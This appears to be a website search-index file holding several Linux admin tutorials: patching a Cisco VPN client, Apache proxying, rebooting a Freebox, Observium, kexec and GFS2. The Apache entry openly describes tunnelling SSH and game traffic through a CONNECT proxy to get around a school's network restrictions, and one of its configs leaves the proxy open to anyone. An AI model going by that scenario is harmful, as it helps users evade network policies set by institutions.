skb-\u003enetwork_header = (sk_buff_data_t) skb-\u003edata; - skb-\u003emac_header = (sk_buff_data_t)pMac; +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + * We have to use (pMac - skb-\u003edata) to get an offset. + * We need to cast ptrs to byte ptrs and take the difference. + */ + skb_reset_network_header(skb); + skb_set_mac_header(skb, (int)((void *)pMac - (void *)skb-\u003edata)); #else skb-\u003enh.iph = (struct iphdr *) skb-\u003edata; skb-\u003emac.raw = pMac; @@ -478,8 +482,12 @@ skb-\u003edev = pBinding-\u003epDevice; #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) - skb-\u003emac_header = (sk_buff_data_t)pMac; - skb-\u003enetwork_header = (sk_buff_data_t)pIP; +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + * We have to use (pIP/pMac - skb-\u003edata) to get an offset. + * We need to cast ptrs to byte ptrs and take the difference. + */ + skb_set_mac_header(skb, (int)((void *)pMac - (void *)skb-\u003edata)); + skb_set_network_header(skb, (int)((void *)pIP - (void *)skb-\u003edata)); #else skb-\u003emac.raw = pMac; skb-\u003enh.raw = pIP; @@ -487,8 +495,13 @@ /*ip header length is in 32bit words */ #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) - skb-\u003etransport_header = (sk_buff_data_t) - (pIP + (((struct iphdr*)(skb-\u003enetwork_header))-\u003eihl * 4)); +/* 2.6.22 added an inline function for 32-/64-bit usage here, so use it. + * We have to use (pIP - skb-\u003edata) to get an offset. + * We need to cast ptrs to byte ptrs and take the difference. + */ + skb_set_transport_header(skb, + ((int)((void *)pIP - (void *)skb-\u003edata) + + ((((struct iphdr*)(skb_network_header(skb))))-\u003eihl * 4))); #else skb-\u003eh.raw = pIP + (skb-\u003enh.iph-\u003eihl * 4); #endif diff -urN vpnclient.orig/linuxkernelapi.c vpnclient/linuxkernelapi.c --- vpnclient.orig/linuxkernelapi.c\t2008-06-23 17:59:12.000000000 +0100 +++ vpnclient/linuxkernelapi.c\t2008-07-09 23:16:54.000000000 +0100 @@ -9,7 +9,10 @@ void*rc = kmalloc(size, GFP_ATOMIC); if(NULL == rc) { - printk(\"\u003c1\u003e os_malloc size %d failed\\n\",size); +/* Allow for 32- or 64-bit size + * printk(\"\u003c1\u003e os_malloc size %d failed\\n\",size); + */ + printk(\"\u003c1\u003e os_malloc size %ld failed\\n\", (long)size); } return rc; And also this patch for kernels above 2.6.31:\ndiff -uBbr vpnclient.orig/interceptor.c vpnclient/interceptor.c --- vpnclient.orig/interceptor.c\t2009-10-07 20:22:56.000000000 +0200 +++ vpnclient/interceptor.c\t2009-10-07 20:28:48.000000000 +0200 @@ -120,6 +120,14 @@ .notifier_call = handle_netdev_event, }; +#if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,31) +static const struct net_device_ops vpn_netdev_ops = { + .ndo_start_xmit = interceptor_tx, + .ndo_get_stats = interceptor_stats, + .ndo_do_ioctl = interceptor_ioctl, +}; +#endif + #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,22) static int #else @@ -128,10 +136,13 @@ interceptor_init(struct net_device *dev) { ether_setup(dev); - + #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,31) + dev-\u003enetdev_ops = \u0026vpn_netdev_ops; + #else dev-\u003ehard_start_xmit = interceptor_tx; dev-\u003eget_stats = interceptor_stats; dev-\u003edo_ioctl = interceptor_ioctl; + #endif dev-\u003emtu = ETH_DATA_LEN-MTU_REDUCTION; kernel_memcpy(dev-\u003edev_addr, interceptor_eth_addr,ETH_ALEN); @@ -268,8 +279,13 @@ Bindings[i].original_mtu = dev-\u003emtu; /*replace the original send function with our send function */ + #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,31) + Bindings[i].InjectSend = dev-\u003enetdev_ops-\u003endo_start_xmit; + dev-\u003enetdev_ops-\u003endo_start_xmit = replacement_dev_xmit; + #else Bindings[i].InjectSend = dev-\u003ehard_start_xmit; dev-\u003ehard_start_xmit = replacement_dev_xmit; + #endif /*copy in the ip packet handler function and packet type struct */ Bindings[i].InjectReceive = original_ip_handler.orig_handler_func; @@ -291,7 +307,11 @@ if (b) { rc = 0; + #if LINUX_VERSION_CODE \u003e= KERNEL_VERSION(2,6,31) + dev-\u003enetdev_ops-\u003endo_start_xmit = b-\u003eInjectSend; + #else dev-\u003ehard_start_xmit = b-\u003eInjectSend; + #endif kernel_memset(b, 0, sizeof(BINDING)); } else Now let’s apply the patches:\npatch \u003c vpnclient-linux-4.8.02-64bit.patch patch \u003c vpnclient-linux-2.6.31-final.diff The last two modifications for the route:\nsed -i 's/^CFLAGS/EXTRA_CFLAGS/' Makefile sed -i 's/const\\ struct\\ net_device_ops\\ \\*netdev_ops;/struct\\ net_device_ops\\ \\*netdev_ops;/' `find /usr/src -name netdevice.h` And finally, let’s run the installation:\n./vpn_install This should produce output like:\nCisco Systems VPN Client Version 4.8.02 (0030) Linux Installer Copyright (C) 1998-2006 Cisco Systems, Inc. All Rights Reserved. By installing this product you agree that you have read the license.txt file (The VPN Client license) and will comply with its terms. Directory where binaries will be installed [/usr/local/bin] Automatically start the VPN service at boot time [yes] In order to build the VPN kernel module, you must have the kernel headers for the version of the kernel you are running. Directory containing linux kernel source code [/lib/modules/2.6.32-131.0.15.el6.x86_64/build] * Binaries will be installed in \"/usr/local/bin\". * Modules will be installed in \"/lib/modules/2.6.32-131.0.15.el6.x86_64/CiscoVPN\". * The VPN service will be started AUTOMATICALLY at boot time. * Kernel source from \"/lib/modules/2.6.32-131.0.15.el6.x86_64/build\" will be used to build the module. Is the above correct [y] Making module make -C /lib/modules/2.6.32-131.0.15.el6.x86_64/build SUBDIRS=/root/test/vpnclient modules make[1]: Entering directory `/usr/src/kernels/2.6.32-131.0.15.el6.x86_64' CC [M] /root/test/vpnclient/linuxcniapi.o CC [M] /root/test/vpnclient/frag.o CC [M] /root/test/vpnclient/interceptor.o /root/test/vpnclient/interceptor.c: In function 'interceptor_init': /root/test/vpnclient/interceptor.c:140: warning: assignment discards qualifiers from pointer target type CC [M] /root/test/vpnclient/linuxkernelapi.o LD [M] /root/test/vpnclient/cisco_ipsec.o Building modules, stage 2. MODPOST 1 modules WARNING: could not find /root/test/vpnclient/.libdriver64.so.cmd for /root/test/vpnclient/libdriver64.so CC /root/test/vpnclient/cisco_ipsec.mod.o LD [M] /root/test/vpnclient/cisco_ipsec.ko.unsigned NO SIGN [M] /root/test/vpnclient/cisco_ipsec.ko make[1]: Leaving directory `/usr/src/kernels/2.6.32-131.0.15.el6.x86_64' Create module directory \"/lib/modules/2.6.32-131.0.15.el6.x86_64/CiscoVPN\". Copying module to directory \"/lib/modules/2.6.32-131.0.15.el6.x86_64/CiscoVPN\". Already have group 'bin' Creating start/stop script \"/etc/init.d/vpnclient_init\". /etc/init.d/vpnclient_init Enabling start/stop script for run level 3,4 and 5. Creating global config /etc/opt/cisco-vpnclient Installing license.txt (VPN Client license) in \"/opt/cisco-vpnclient/\": /opt/cisco-vpnclient/license.txt Installing bundled user profiles in \"/etc/opt/cisco-vpnclient/Profiles/\": * New Profiles : sample Copying binaries to directory \"/opt/cisco-vpnclient/bin\". Adding symlinks to \"/usr/local/bin\". /opt/cisco-vpnclient/bin/vpnclient /opt/cisco-vpnclient/bin/cisco_cert_mgr /opt/cisco-vpnclient/bin/ipseclog Copying setuid binaries to directory \"/opt/cisco-vpnclient/bin\". /opt/cisco-vpnclient/bin/cvpnd Copying libraries to directory \"/opt/cisco-vpnclient/lib\". /opt/cisco-vpnclient/lib/libvpnapi.so Copying header files to directory \"/opt/cisco-vpnclient/include\". /opt/cisco-vpnclient/include/vpnapi.h Setting permissions. /opt/cisco-vpnclient/bin/cvpnd (setuid root) /opt/cisco-vpnclient (group bin readable) /etc/opt/cisco-vpnclient (group bin readable) /etc/opt/cisco-vpnclient/Profiles (group bin readable) /etc/opt/cisco-vpnclient/Certificates (group bin readable) * You may wish to change these permissions to restrict access to root. * You must run \"/etc/init.d/vpnclient_init start\" before using the client. * This script will be run AUTOMATICALLY every time you reboot your computer. Resources linkhttp://micro.stanford.edu/wiki/How_to_install_and_configure_the_Cisco_VPN_client_on_a_Linux_computer\nhttp://www.lamnk.com/blog/vpn/how-to-install-cisco-vpn-client-on-ubuntu-jaunty-jackalope-and-karmic-koala-64-bit/\nhttp://forum.tuxx-home.at/viewtopic.php?f=15\u0026t=957\n"
            }
        );
    index.add(
            {
                id:  346 ,
                href: "\/Proxy:%C2%A0Cr%C3%A9er_un_proxy_avec_Apache\/",
                title: "Proxy: Creating a proxy with Apache",
                description: "Guide on how to set up and configure an Apache proxy server for different use cases including tunneling SSH over HTTP and setting up a reverse proxy for applications.",
                content: "Introduction linkWith Apache’s mod_proxy, there are several use cases. I will propose two scenarios here.\nScenario 1 linkHere’s the situation! I’m in a computer school where (like in many schools) only port 80 is open, and the class isn’t always interesting.\nSo what can you do to access your SSH server, play World of Warcraft, or download heavily from eMule?\nWell, Uncle Tom has a super pattern for you who wants to break the laws: the APACHE MOD_PROXY PLATINUM EDITION!\nHere we’re working on Debian, but the configuration is essentially the same on other systems as long as you’re using Apache2’s mod_proxy.\nScenario 2 linkIn this scenario, I want to redirect incoming traffic on my standard port (80) to an application (on the same machine or not) using URL rewriting. The advantage is that with mod_proxy, there’s no need to use RewriteEngine \u0026 Co! The proxy module can handle most of the rewriting, especially hiding the port number (useful for applications running on Tomcat).\nInstallation link aptitude install apache2 apache2-utils apache2.2-common libapache2-mod-proxy-html Then activate modules:\na2enmod proxy_connect a2enmod proxy_http a2enmod proxy_html And restart Apache.\nConfiguration linkScenario 1 linkDebian linkFirst, we’ll configure the mod_proxy in question. Here’s my detailed /etc/apache2/mods-available/proxy.conf file:\n#On autorise les requêtes de type proxy ProxyRequests On #On autorise le serveur à répondre à ces requêtes ProxyVia On #On autorise les requêtes proxy en destination du port 22, 80 et 443 AllowCONNECT 22 AllowCONNECT 80 AllowCONNECT 443 #On autorise le proxy à destination de n'importe quelle adresse # (Pour restreindre qu'a une seule adresse il faut mettre quelque chose comme #\"\" ou encore \"\") # Nous allons restreindre l'accès par mot de passe AllowOverride AuthConfig AuthName \"Proxy Auth\" AuthType Basic # Le fichier htpasswd à utiliser AuthUserFile /etc/apache2/.htpasswd-proxy # seuls les utilisateurs authentifiés ont accès Require valid-user AddDefaultCharset off Order deny,allow Allow from all Next, we create the “htpasswd” file (e.g., for the user toto)\nhtaccess -c /etc/apache2/.htpasswd-proxy toto Now we just need to load the modules\ncd /etc/apache2/mods-enabled/ ln -s ../mods-available/proxy.load . ln -s ../mods-available/proxy.conf . ln -s ../mods-available/proxy_connect.load . ln -s ../mods-available/proxy_http.load . Then restart Apache2\n/etc/init.d/apache2 restart OpenBSD linkWith OpenBSD, no specific installation is needed since Apache is installed by default. Just add this to the configuration:\n# General setup for the virtual host DocumentRoot /var/www/htdocs ServerName mufasa.deimos.fr ServerAdmin xxx@mycompany.com ErrorLog logs/error_log TransferLog logs/access_log # SSL Engine Switch: # Enable/Disable SSL for this virtual host. SSLEngine off ProxyRequests On ProxyVia On Order deny,allow Allow from all Then restart the service:\napachectl stop apachectl start Obviously, this allows everyone access, so make sure to add some security.\nPersonally, my Apache is bound to a port that only the local network and people connected via VPN can access.\nPuTTY: Tunneling SSH linkSo now we have a nice proxy, but how to make the most of it?\nWe’ll use PuTTY to simplify things, as it’s one of the few cross-platform SSH clients that offers all the functions we need: Tunneling + HTTP Proxy.\nThe principle is as follows:\nEstablish an SSH connection on port 22 Go through this proxy server which authorizes connections on port 22 Using SSH, we establish encrypted local tunnels that redirect to different services We access the services on localhost through the tunnels Here’s how I configure my PuTTY client to play World of Warcraft:\n{Session Menu}\nHost Name: Port: 22 {Proxy Menu}\nProxy type: HTTP Proxy hostname: Port: 80 Username: Password: {SSH / Tunnels Menu}\nLocal Ports accept connections from other hosts: ON Source port: (ex. 3724) Destination: (ex. eu.logon.worldofwarcraft.com:3724) Click on “add” to add others e.g., 5900:vnc; 143:imap; 25:smtp (for WoW, don’t forget this one)\nSource port: \"6112\" Destination: \"80.239.185.41:6112\" That’s good! For World of Warcraft, all that’s left is to modify the “realmlist.wtf” file and put:\nset realmlist localhost As a famous philosopher would say: “And the show begins!”\nScenario 2 linkHere I’ll use the example of a “myapp” tool running on Tomcat, port 8080. First, I need to tell Tomcat that it will be “proxified,” and then I need to set up the proxy part on Apache.\nTomcat linkOn the server side, you’ll need to modify the connector for the application in question to add the proxy parameters:\nWe’re telling Tomcat that our site will be accessible from myapp.mycompany.lan on port 80. You can restart your Tomcat now.\nApache linkWe’ll activate the proxy module:\n# If you want to use apache2 as a forward proxy, uncomment the # 'ProxyRequests On' line and the block below. # WARNING: Be careful to restrict access inside the block. # Open proxy servers are dangerous both to your network and to the # Internet at large. # # If you only want to use apache2 as a reverse proxy/gateway in # front of some web application server, you DON'T need # 'ProxyRequests On'. ProxyRequests Off ProxyPreserveHost On AddDefaultCharset off Order deny,allow Allow from all #Allow from .example.com # Enable/disable the handling of HTTP/1.1 \"Via:\" headers. # (\"Full\" adds the server version; \"Block\" removes all outgoing Via: headers) # Set to one of: Off | On | Full | Block ProxyVia On Then configure it for our site. We’ll use a VirtualHost for our application:\nServerName http://myapp.mycompany.lan ServerAlias myapp.mycompany.lan ServerAdmin xxx@mycompany.com DocumentRoot /mnt/myapp/datas/www ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ LogLevel warn ServerSignature On ProxyPass / http://localhost:8080/ ProxyPassReverse / http://localhost:8080/ Order allow,deny Allow from all The ProxyPass part tells where to redirect the proxy. Here the Apache proxy and Tomcat are running on the same machine, which is why the URLs point to localhost.\nAll that’s left is to restart Apache, and your service that was originally available at this address: http://myapp.mycompany.lan:8080/ will be available at: http://myapp.mycompany.lan/\nResources linkhttp://httpd.apache.org/docs/2.0/mod/mod_proxy.html\n"
            }
        );
    index.add(
            {
                id:  347 ,
                href: "\/Rebooter_sa_Freebox_Server_6_en_ligne_de_commande\/",
                title: "Reboot Your Freebox Server 6 via Command Line",
                description: "A guide on how to reboot your Freebox Server 6 from the command line, including installation instructions for pfSense and other systems.",
                content: "Introduction linkSince version 6 of the Freebox, there is a web interface (https://mafreebox.freebox.fr) that allows you to control several options, including rebooting it. We will use this capability to restart it via the command line. For this purpose, I’m using a script that was obtained from admin-linux.fr.\nI tested it on Debian and it works natively. On pfSense 2.0.1, I encountered a few small issues. That’s why I will detail here how I resolved them.\nInstallation linkPrerequisites linkYou’ll need bash and wget to run the script that follows. On most distributions, there are no issues as they are already installed. But on minimal or embedded versions, this can cause problems. I will explain how to proceed on pfSense.\npkg_add linkInstall wget and bash:\npkg_add -vr wget pkg_add -vr bash Manually linkIf you encounter problems because the repository no longer exists, take the one closest to your version and upload the files to your machine (pfSense for example):\nwget ftp://ftp.freebsd.org/pub/FreeBSD/ports/i386/packages-8.2-release/ftp/wget-1.12_2.tbz wget ftp://ftp.beastie.tdk.net/pub/FreeBSD/ports/i386/packages-8.2-release/shells/bash-4.1.9.tbz Then we’ll decompress everything:\ncd / tar -xzf wget-1.12_2.tbz tar -xzf bash-4.1.9.tbz Script linkLet’s put this script in /bin/freebox for example:\n#!/bin/bash # Description : Script for rebooting the FreeBox #\tfrom the command line. # Author : FHH # $Id: freebox,v 1.6 2011/08/28 22:59:56 fhh Exp $ # Global script variables: USERNAME=\"freebox\" ; URL=\"http://mafreebox.freebox.fr\" ; WORKING_DIRECTORY=\"${HOME}/.freebox\" ; CONFIG_FILE=\"${WORKING_DIRECTORY}/config\" ; TMP_DIRECTORY=\"${WORKING_DIRECTORY}/tmp\" ; COOKIES=\"cookies\" ; FREE_LOGIN_SCRIPT=\"/login.php\" ; FREE_REBOOT_CGI=\"/system.cgi\" ; WGET_OPTS=\"-T1 -t1 -qO /dev/null\" ; # usage : Display help usage () { echo -e \"$0 [command]\\n\" ; echo \"Options\" ; echo \" -h\t: Display this help message.\" ; echo \" -p : Specify the FreeBox password.\" ; echo ; echo \"Commands\" ; echo \" restart\t: Restart the freebox.\" ; echo \" savepass\t: Save the password.\" ; echo ; echo \"In case of malfunction, check your \" ; echo \"FreeBox password and/or the file \\\"~/.freebox/config\\\".\" ; } # Script exit function: die() { echo $@ \u003e\u00262 ; exit 1 ; } # Authentication function on the FreeBox auth() { # Authentication and cookie registration: wget ${WGET_OPTS} --save-cookies \"${TMP_DIRECTORY}/${COOKIES}\" --post-data \"login=${USERNAME}\u0026passwd=${password}\" \"${URL}/${FREE_LOGIN_SCRIPT}\" ; #\tIf the cookie is not downloaded, authentication failed: [ -e \"${TMP_DIRECTORY}/${COOKIES}\" ] || die \"\u003e Authentication failure. Check the password.\" ; [ ! -z \"$(sed -e 's/[[:blank:]]//g' -e '/^#\\|^$/d' \"${TMP_DIRECTORY}/${COOKIES}\")\" ] || die \"\u003e Authentication failed. Check the password.\" ; } # Password input function askpwd() { cpt=0 ; while [ -z \"${password}\" ] ; do (( ${cpt} \u003e= 3 )) \u0026\u0026 die \"\u003e You must provide your password. Stop!\" ; (( cpt = cpt + 1 )) ; read -sp \"Password: \" password ; echo ; done } init () { [ ! -d \"${WORKING_DIRECTORY}\" ] \u0026\u0026 { mkdir \"${WORKING_DIRECTORY}\" || die \"\u003e Unable to create \\\"${WORKING_DIRECTORY}\\\"\" ; } [ ! -d \"${TMP_DIRECTORY}\" ] \u0026\u0026 { mkdir \"${TMP_DIRECTORY}\" || die \"\u003e Unable to create \\\"${TMP_DIRECTORY}\\\"\" ; } [ -e \"${TMP_DIRECTORY}/${COOKIES}\" ] \u0026\u0026 rm \"${TMP_DIRECTORY}/${COOKIES}\" ; } connection () { wget ${WGET_OPTS} ${URL} ; case $? in 4) die \"\u003e Problem accessing the Freebox. Try to connect manually\" ;; 5) die \"\u003e SSL problem. Try to connect manually\" ;; esac } cleancook () { # Cleanup of the cookie: [ -e \"${TMP_DIRECTORY}/${COOKIES}\" ] \u0026\u0026 rm \"${TMP_DIRECTORY}/${COOKIES}\" ; } # Function to restart the FreeBox restart () { init ; [ -z \"${password}\" -a -r \"${CONFIG_FILE}\" ] \u0026\u0026 . ${CONFIG_FILE} ; connection ; askpwd ; auth ; #\tRestart the freebox: wget ${WGET_OPTS} --load-cookies \"${TMP_DIRECTORY}/${COOKIES}\" --post-data 'method=system.reboot\u0026redirect_after=/reboot.php\u0026timeout=1' -p \"${URL}/${FREE_REBOOT_CGI}\" ; cleancook ; } savepass () { init ; askpwd ; auth ; echo \"password=${password}\" \u003e \"${CONFIG_FILE}\" ; chmod 0600 \"${CONFIG_FILE}\" cleancook ; } # Main program: (( $# \u003e 0 )) || { usage ; exit 0; } while getopts \":p:h\" opt ; do case ${opt} in p) password=${OPTARG} ;; h) usage ; exit 0 ;; :) echo -e \"\u003e Option -$OPTARG requires an argument.\\n\" ; usage ; exit 1 ;; *) echo -e \"\u003e Invalid option \\\"-$OPTARG\\\".\\n\" ; usage ; exit 1 ;; esac done shift $((OPTIND-1)) (( $# \u003e 1 )) \u0026\u0026 { echo -e \"\u003e Only one command at a time.\\n\" ; usage ; exit 1 ; } ; (( $# \u003c 1 )) \u0026\u0026 { echo -e \"\u003e No command specified.\\n\" ; usage ; exit 1 ; } ; case $1 in restart) restart ;; savepass) savepass ;; *) echo -e \"\u003e $1 : Unknown command!\\n\" ; usage ; exit 1 ;; esac Then give it the correct permissions:\nchmod 555 /bin/freebox Usage linkWe’ll save the password for the Freebox interface like this:\n\u003e freebox savepass Password: Here is the method to restart the Freebox:\nfreebox reboot Resources linkhttps://www.admin-linux.fr/?p=5049\n"
            }
        );
    index.add(
            {
                id:  348 ,
                href: "\/Observium_:_Une_interface_%C3%A9volu%C3%A9e_pour_Collectd\/",
                title: "Observium: An Advanced Interface for Collectd",
                description: "Learn how to set up Observium to provide an advanced graphical interface for Collectd monitoring data, including installation, configuration, and integration with SNMP.",
                content: " Introduction linkObservium is a graphically oriented monitoring tool similar to Munin. The advantage of this solution is that it manages RRD graphs from Collectd.\nSince today, a high-performance graphical interface is really something that’s missing from Collectd, it would be a shame to have such a powerful solution without an equally capable interface. That’s why after much research, I finally came across Observium which meets this need.\nInstallation linkPrerequisites linkWe’ll use Debian 6 for this tutorial. Here is the list of required packages (use non-free repositories for the snmp-mibs-downloader package):\naptitude install libapache2-mod-php5 php5-cli php5-mysql php5-gd php5-snmp php-pear snmp graphviz subversion mysql-server mysql-client rrdtool fping imagemagick whois mtr-tiny nmap ipmitool snmp-mibs-downloader php-net-ipv4 Then we’ll install a necessary PHP IPv6 library that unfortunately isn’t packaged:\npear install Net_IPv6 Observium linkNow we’ll download and extract Observium, then create some necessary folders:\ncd /var/www/ wget http://www.observium.org/observium-latest.tar.gz tar -xzf observium-latest.tar.gz rm -f observium-latest.tar.gz cd /var/www/observium mkdir graphs rrd chown -Rf www-data. . We create a basic configuration file:\ncp config.php.default config.php MySQL linkLet’s move on to the database. We need to create it with a user (don’t forget to replace the password):\n\u003e mysql -uroot -p mysql\u003e CREATE DATABASE observium; mysql\u003e GRANT ALL PRIVILEGES ON observium.* TO 'observium'@'localhost' IDENTIFIED BY ''; mysql\u003e flush privileges; Let’s change the Observium location in the configuration file, add an entry for fping, and modify the SQL fields to adapt them with the correct data (/var/www/observium/config.php):\n\u003c?php ## Have a look in defaults.inc.php for examples of settings you can set here. DO NOT EDIT defaults.inc.php! ### Database config $config['db_host'] = \"localhost\"; $config['db_user'] = \"USERNAME\"; $config['db_pass'] = \"PASSWORD\"; $config['db_name'] = \"observium\"; ### Locations $config['fping'] = \"/usr/bin/fping\"; $config['install_dir'] = \"/var/www/observium\"; ... Next, we’ll import the schema for building the database:\nmysql -uobservium -p observium \u003c database-schema.sql And we’ll update the database with some updates:\nscripts/update-sql.php database-update-pre1000.sql scripts/update-sql.php database-update-pre1435.sql scripts/update-sql.php database-update-pre2245.sql scripts/update-sql.php database-update.sql Apache linkThen we’ll create the Apache configuration for this new site (don’t forget to make the DNS record) (/etc/apache2/sites-available/observium):\nDocumentRoot /var/www/observium/html/ ServerName observium.mycompany.com CustomLog /var/log/apache2/access.log combined ErrorLog /var/log/apache2/error.log "
            }
        );
    index.add(
            {
                id:  349 ,
                href: "\/Kexec_:_optimisez_vos_temps_de_boot\/",
                title: "Kexec: Optimize Your Boot Times",
                description: "A guide on how to use kexec to optimize boot times by skipping hardware initialization, especially useful for high availability systems.",
                content: "Introduction linkKexec is a tool that allows rebooting a machine without going through the hardware layer. It will stop all services, shut down the init processes (sysV) to reach the bootloader. Then it will start normally, bypassing the hardware reboot phase.\nThis technique can be very useful on High Availability systems where downtime is critical.\nInstallation linkDebian linkOn Debian, you need to install this package:\naptitude install kexec-tools Red Hat linkOn Red Hat, you need to have this package installed:\nyum install kexec-tools Configuration linkDebian linkThere is a configuration file that allows you to make some modifications such as loading a newer kernel if one exists. This technique is not particularly recommended as some applications may not handle it well, though this is relatively rare. This option is not enabled by default, however, you can activate it if needed:\n# Defaults for kexec initscript # sourced by /etc/init.d/kexec and /etc/init.d/kexec-load # Load a kexec kernel (true/false) LOAD_KEXEC=true # Kernel and initrd image KERNEL_IMAGE=\"/vmlinuz\" INITRD=\"/initrd.img\" # If empty, use current /proc/cmdline APPEND=\"\" # Load the default kernel from grub config (true/false) USE_GRUB_CONFIG=false Red Hat linkLike Debian, Red Hat has its own configuration for kexec:\n# Kernel Version string for the -kdump kernel, such as 2.6.13-1544.FC5kdump # If no version is specified, then the init script will try to find a # kdump kernel with the same version number as the running kernel. KDUMP_KERNELVER=\"\" # The kdump commandline is the command line that needs to be passed off to # the kdump kernel. This will likely match the contents of the grub kernel # line. For example: # KDUMP_COMMANDLINE=\"ro root=LABEL=/\" # If a command line is not specified, the default will be taken from # /proc/cmdline KDUMP_COMMANDLINE=\"\" # This variable lets us append arguments to the current kdump commandline # As taken from either KDUMP_COMMANDLINE above, or from /proc/cmdline KDUMP_COMMANDLINE_APPEND=\"irqpoll nr_cpus=1 reset_devices cgroup_disable=memory\" # Any additional /sbin/mkdumprd arguments required. MKDUMPRD_ARGS=\"\" # Any additional kexec arguments required. In most situations, this should # be left empty # # Example: # KEXEC_ARGS=\"--elf32-core-headers\" KEXEC_ARGS=\"\" #Where to find the boot image KDUMP_BOOTDIR=\"/boot\" #What is the image type used for kdump KDUMP_IMG=\"vmlinuz\" #What is the images extension. Relocatable kernels don't have one KDUMP_IMG_EXT=\"\" The default options do not need to be modified.\nUtilization linkDebian linkWhen kexec is installed, the reboot command calls kexec and therefore natively reboots via kexec. Here are the useful commands:\nreboot: executes a fast reboot of the machine via kexec coldreboot: performs a standard reboot including hardware reboot Red Hat linkFor Red Hat, run this command:\nkexec -l /boot/vmlinuz-`uname -r` --initrd=/boot/initramfs-`uname -r`.img --command-line=\"`sed 's/ rhgb\\| quiet//g' /proc/cmdline`\" Now, to launch a fast reboot, use the standard reboot command.\nI made a small script to do all of this:\n#!/bin/sh # Made by Pierre Mavro (Deimosfr) | 15/03/2012 echo \"Do you want to perform a fast reboot (without hardware reboot) ? (y/n)\" read ans if [ $ans = 'y' ] ; then echo \"Fast reboot in progress...\" kexec -l /boot/vmlinuz-`uname -r` --initrd=/boot/initramfs-`uname -r`.img --command-line=\"`sed 's/ rhgb\\| quiet//g' /proc/cmdline`\" reboot exit 0 fi echo \"Fast reboot cancelled\" Resources linkhttp://wiki.debian.org/BootProcessSpeedup#Using_kexec_for_warm_reboots\nhttp://archive09.linux.com/feature/150202.html\nhttp://fedoraproject.org/wiki/Kernel/kexec\nhttp://fedoraproject.org/wiki/Archive:FC6KdumpKexecHowTo\n"
            }
        );
    index.add(
            {
                id:  350 ,
                href: "\/GFS2_:_Le_Filesystem_Cluster_de_Red_Hat\/",
                title: "GFS2: Red Hat Cluster Filesystem",
                description: "Learn how to install and configure GFS2, the Global File System cluster filesystem developed by Red Hat for Linux.",
                content: "Introduction linkGlobal File System (GFS) is a shared file system designed for Linux or IRIX clusters. GFS and GFS2 are different from distributed file systems like AFS, Coda, or InterMezzo because they allow all nodes to have direct concurrent access to the same block storage device. Additionally, GFS and GFS2 can also be used as a local file system.\nGFS does not have a disconnected mode; there are no clients or servers. All nodes in a GFS cluster are equal. Using GFS in a computer cluster requires hardware that allows access to shared data and a lock manager to control access to the data. The lock manager is a separate module, therefore GFS and GFS2 can use a Distributed Lock Manager (DLM) for cluster configurations and the “nolock” lock manager for local file systems. Older versions of GFS also support GULM, a server-based lock manager that implements redundancy through failover.\nGFS2 tends to experience performance degradation when there are too many files in a directory. However, there are no issues with large files or many directories with few files in them.\nGFS and GFS2 are free software, distributed under the GPL license.\nThis documentation was created on Red Hat Enterprise Linux 6.2.\nPrerequisites link You need to know how to use LVM. You must use LVM Cluster to be able to use GFS2 (and therefore the cluster part as well). If you want to use quotas, it’s better to have a good understanding of how standard filesystem quotas work by following this documentation. Installation linkTo install GFS2:\nyum -y install gfs2-utils Configuration linkTo format a GFS2 partition:\n\u003e mkfs.gfs2 -p lock_dlm -t cluter_name:gfs_name -j 3 /dev/my_vg/my_gfs This will destroy any data on /dev/my_vg/my_gfs. Are you sure you want to proceed? [y/n] y Device: /dev/my_vg/my_gfs Blocksize: 4096 Device Size 0.50 GB (131072 blocks) Filesystem Size: 0.50 GB (131070 blocks) Journals: 1 Resource Groups: 2 Locking Protocol: \"lock_dlm\" Lock Table: \"cluter:gfs_web\" UUID: 27DBECB7-E200-E8D9-D484-179AB59B5595 -p lock_dlm: allows locking the partition during formatting -t cluter_name:gfs_name: the cluster name and a name for the GFS -j 3: indicates the number of journals to create (1 per node, if there aren’t enough, it won’t be mountable on more nodes) Then to mount a GFS2 partition:\nmount -t gfs2 /dev/my_vg/my_gfs /mnt In case of emergency, you need to access it to recover data:\nmount -t gfs2 -o lockproto=lock_nolock /dev/my_vg/my_gfs /mnt If the partition needs to be mounted on another cluster:\nmount -t gfs2 -o locktable=cluster_name:gfs_name /dev/my_vg/my_gfs /mnt When you add a node that needs to access a GFS2 partition, you need to add a journal, otherwise the mount will be refused:\ngfs2_jadd -j 1 /mnt I used the mount point here, but you can also use the device in /dev.\nQuotas linkYou can use quotas, but they work differently from standard quotas:\nmount -t gfs2 -o quota=on /dev/my_vg/my_gfs /mnt For hard quota limitation:\ngfs2_quota limit -u user -l size /mountpoint size: size in Megabytes For soft quota limitation:\ngfs2_quota warn -u user -l size /mountpoint To list a user’s quotas:\ngfs2_quota get -u user And to list quotas for a mount point:\ngfs2_quota list -f /mountpoint Expanding a Partition linkTo expand a partition, you’ll need to create a new PV, extend the VG, and extend the LV:\npvcreate /dev/sdb vgextend my_vg /dev/sdb lvextend -L +10G /dev/my_vg/my_gfs gfs2_grow -v /mountpoint Repairing a Partition link gfs2_fsck /dev/my_vg/my_gfs Modifying the Superblock linkSometimes it’s necessary to change the superblock, for example, if you have a “lock_nolock” option that was created during the mkfs of your partition and you now want to change it.\nYou must unmount your partition before proceeding further. To change the lock manager:\ngfs2_tool sb proto [lock_dlm,lock_nolock] To lock the table name:\ngfs2_tool sb table cluster:my_gfs To list information about the superblock:\ngfs2_tool sb all "
            }
        );
    index.add(
            {
                id:  351 ,
                href: "\/OCFS2%C2%A0:%C2%A0Le_FileSystem_Cluster_d%27Oracle\/",
                title: "OCFS2: Oracle's Cluster File System",
                description: "Guide for setting up and configuring OCFS2, Oracle's cluster file system for shared storage with fault tolerance.",
